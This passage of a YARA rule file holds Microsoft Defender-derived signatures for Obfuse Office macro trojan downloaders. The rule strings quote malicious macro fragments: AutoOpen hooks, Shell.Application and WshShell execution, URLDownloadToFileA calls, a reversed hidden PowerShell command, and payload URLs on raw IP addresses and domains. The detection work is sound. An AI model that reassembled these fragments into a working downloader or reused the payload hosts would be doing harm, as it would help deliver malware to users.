        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CallByName IIIIIII3, \"Run\", VbMethod, WINDOWS1.Label1.Tag + \" \" & WINDOWS1.Tag + \" \", 0, False" ascii //weight: 1
        $x_1_2 = "CreateObject(WINDOWS1.Label2.Tag)" ascii //weight: 1
        $x_1_3 = "CallByName UserForm1, \"Show\", VbMethod" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HV_2147741740_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HV!MTB"
        threat_id = "2147741740"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-22] 29 2e 56 61 6c 75 65 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = ", Null, Null, Null" ascii //weight: 1
        $x_1_4 = {53 70 6c 69 74 28 [0-52] 2c 20 22 7c 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-52] 28 [0-52] 28 31 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HW_2147741770_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HW!MTB"
        threat_id = "2147741770"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "asnt5655 & Chr(92) & Rnd & \".jse\"" ascii //weight: 1
        $x_1_2 = "Set shellObj = objOL.CreateObject(\"Shell.Application\", \"\")" ascii //weight: 1
        $x_1_3 = "shellObj.ShellExecute nnn6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HX_2147741864_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HX!MTB"
        threat_id = "2147741864"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "h\" & Mid(" ascii //weight: 1
        $x_1_2 = ") & \"!!!\": Next" ascii //weight: 1
        $x_1_3 = ", Null, Null, Null" ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-53] 2c 20 22 21 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 70 6c 69 74 28 [0-55] 2c 20 22 7c 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HY_2147741882_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HY!MTB"
        threat_id = "2147741882"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c [0-48] 2e 6a 73 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = ".Controls(0).ControlTipText" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_4 = {2e 4e 61 6d 65 53 70 61 63 65 28 22 43 3a 5c 57 69 6e 64 6f 77 73 [0-7] 54 65 6d 70 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".InvokeVerb (\"Op" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HZ_2147741905_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HZ!MTB"
        threat_id = "2147741905"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CallByName ObjectPep3, \"Run\", VbMethod, Form2.Label1.Tag + \" \" & Form2.Tag + \" \", 0, False" ascii //weight: 1
        $x_1_2 = "= CreateObject(Form2.Label2.Tag)" ascii //weight: 1
        $x_1_3 = "CallByName UserForm1, \"Show\", VbMethod" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HZ_2147741905_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HZ!MTB"
        threat_id = "2147741905"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 64 75 6c 65 61 6c 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = {68 74 74 70 3a 2f 2f 66 69 6b 69 6d 61 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_4 = {68 74 74 70 3a 2f 2f 64 6a 61 63 65 6c 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_5 = {68 74 74 70 3a 2f 2f 62 65 6c 6c 71 75 65 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_6 = {68 74 74 70 3a 2f 2f 65 72 73 69 6d 70 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_7 = {68 74 74 70 3a 2f 2f 61 72 63 6f 71 61 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_8 = {68 74 74 70 3a 2f 2f 74 79 70 72 65 72 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_9 = {68 74 74 70 73 3a 2f 2f 74 6f 75 6c 6f 75 73 61 2e 63 6f 6d 2f [0-20] 2e 70 68 70}  //weight: 1, accuracy: Low
        $x_1_10 = {68 74 74 70 73 3a 2f 2f 74 6f 75 6c 6f 75 73 61 2e 63 6f 6d 2f [0-20] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IA_2147741935_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IA!MTB"
        threat_id = "2147741935"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-16] 28 [0-22] 2c 20 22 76 65 72 69 6e 73 74 65 72 65 2e 78 6c 73 22 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".Range.Text, \"view this\") Then" ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-7] 2e 54 61 67 29}  //weight: 1, accuracy: Low
        $x_1_4 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_5 = "wordsToRemove(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IB_2147741936_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IB!MTB"
        threat_id = "2147741936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellApp.Open Environ(\"TMP\") + \"\\felldistanceyearshipmentminorityplastics.exe\"" ascii //weight: 1
        $x_1_2 = "\"http://\" & \"1xv4.com/due.jpg\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IC_2147741953_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IC!MTB"
        threat_id = "2147741953"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://138.68.217.234/crypted.exe" ascii //weight: 1
        $x_1_2 = "teMp\\lHcc.exe" ascii //weight: 1
        $x_1_3 = "Chr(119) & a & Chr(114) & Chr(115) & Chr(104) & a & Chr(108) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ID_2147741957_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ID!MTB"
        threat_id = "2147741957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c [0-48] 2e 6a 73 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = ".Controls(0).ControlTipText" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_4 = ".NameSpace(Environ(\"windir\") + \"\\Temp\")" ascii //weight: 1
        $x_1_5 = ".InvokeVerb (\"Op" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IE_2147741980_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IE!MTB"
        threat_id = "2147741980"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = {2b 20 22 5c 22 20 2b 20 [0-36] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = "= Environ(\"windir\") + \"\\Temp\"" ascii //weight: 1
        $x_1_4 = "ll.Application\")" ascii //weight: 1
        $x_1_5 = ".Controls(0).ControlTipText" ascii //weight: 1
        $x_1_6 = ".InvokeVerb (" ascii //weight: 1
        $x_1_7 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IF_2147742019_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IF!MTB"
        threat_id = "2147742019"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 [0-4] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {46 6f 72 20 [0-9] 20 3d 20 31 20 54 6f 20 4c 65 6e 28 [0-9] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4d 69 64 28 [0-9] 2c 20 [0-9] 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 [0-9] 2c 20 [0-9] 2c 20 31 29 29 20 2d 20 [0-9] 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IG_2147742063_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IG!MTB"
        threat_id = "2147742063"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"http://192.99.214.32/word1.tmp\"" ascii //weight: 1
        $x_1_2 = "Call Shell(" ascii //weight: 1
        $x_1_3 = {22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c [0-5] 2e 65 72 74 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IH_2147742075_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IH!MTB"
        threat_id = "2147742075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-9] 2c 20 [0-9] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-9] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 20 [0-9] 28 [0-9] 2e 78 73 6c 22 2c 20 [0-9] 28 [0-9] 2e [0-9] 2e 54 65 78 74 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= New WshShell" ascii //weight: 1
        $x_1_5 = "ActiveDocument.Bookmarks" ascii //weight: 1
        $x_1_6 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_7 = "Print #1," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_II_2147742090_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.II!MTB"
        threat_id = "2147742090"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-64] 29 20 53 74 65 70 20 32 3a 20 4d 69 64 28}  //weight: 1, accuracy: Low
        $x_1_2 = ") & \"@@@\": Next" ascii //weight: 1
        $x_1_3 = ", Null, Null, Null" ascii //weight: 1
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-64] 2c 20 22 40 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IJ_2147742102_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IJ!MTB"
        threat_id = "2147742102"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = {2b 20 22 5c 22 20 2b 20 [0-36] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = "= Environ(\"windir\") + \"\\Temp\"" ascii //weight: 1
        $x_1_4 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 20 28 [0-48] 20 2b 20 22 5c 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = ".Controls(0).ControlTipText" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IJ_2147742102_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IJ!MTB"
        threat_id = "2147742102"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ocne- neddih elytswodniw- llehsrewop" ascii //weight: 1
        $x_1_2 = "aAIEAgAQZAwGA1BAZA8GANBQLAQHAyBwbAAHAtBQS" ascii //weight: 1
        $x_1_3 = "Object(\"winmgmts:root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_4 = "savetofile FilePath & FileName & \".vcf\"" ascii //weight: 1
        $x_1_5 = {55 73 65 64 52 61 6e 67 65 2e 52 6f 77 73 2e 43 6f 75 6e 74 [0-9] 73 68 65 65 74 [0-15] 72 6f 77}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HN_2147742108_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HN!MTB"
        threat_id = "2147742108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fUR = \"http://54.39.233.130/de3.tmp\"" ascii //weight: 1
        $x_1_2 = "Shell fPT(" ascii //weight: 1
        $x_1_3 = "& \".e\" & \"xe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IK_2147742109_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IK!MTB"
        threat_id = "2147742109"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = "= \"windir\"" ascii //weight: 1
        $x_1_3 = "= Environ(E) + \"\\Temp\"" ascii //weight: 1
        $x_1_4 = "For Output As #" ascii //weight: 1
        $x_1_5 = "CreateObject(\"Shell.Application\").Open realpath" ascii //weight: 1
        $x_1_6 = ".Controls(0).ControlTipText" ascii //weight: 1
        $x_1_7 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IL_2147742145_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IL!MTB"
        threat_id = "2147742145"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-9] 28 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 65 6d 70 5c [0-9] 2e 78 73 6c 22 2c 20 [0-9] 28 [0-9] 28 31 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-9] 2c 20 [0-9] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= New WshShell" ascii //weight: 1
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-9] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_6 = "ActiveDocument.Bookmarks" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IM_2147742151_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IM!MTB"
        threat_id = "2147742151"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"windir\") + \"\\Temp\"" ascii //weight: 1
        $x_1_3 = ".Controls(0)" ascii //weight: 1
        $x_1_4 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_5 = " CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_7 = ".Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IN_2147742168_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IN!MTB"
        threat_id = "2147742168"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-16] 28 [0-16] 2e [0-16] 2c 20 22 76 65 72 69 6e 73 74 65 72 65 2e 78 6c 73 22 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = "If InStr(ActiveDocument.Paragraphs(j).Range.Text, \"view this\") Then" ascii //weight: 1
        $x_1_3 = "If InStr(ActiveDocument.Paragraphs(j).Range.Text, \"Error\") Then" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 2e 54 61 67 29}  //weight: 1, accuracy: Low
        $x_1_5 = "(Environ(\"TEMP\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IO_2147742171_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IO!MTB"
        threat_id = "2147742171"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 65 78 65 2e [0-7] 2f 73 63 6f 64 74 68 2f 70 6d 61 78 2f 72 6d 2f 70 6d 61 78 2f 67 72 6f 2e 73 6e 64 6b 63 75 64 2e 72 65 76 72 65 73 73 6e 69 6c 6c 6f 63 2f 2f 3a 70 74 74 68 22}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 22 5c 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e [0-7] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Run p & \" \" & j & \" \"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IQ_2147742185_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IQ!MTB"
        threat_id = "2147742185"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = "\"new:13709620-C279-11CE-A49E-444553540000\"" ascii //weight: 1
        $x_1_3 = "= Environ(\"windir\") + \"\\Temp\"" ascii //weight: 1
        $x_1_4 = ".Controls(0)" ascii //weight: 1
        $x_1_5 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = ".Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IR_2147742188_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IR!MTB"
        threat_id = "2147742188"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-16] 28 65 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c [0-9] 2e 78 73 6c 22 2c 20 [0-16] 28 [0-16] 28 31 29 29 29}  //weight: 1, accuracy: Low
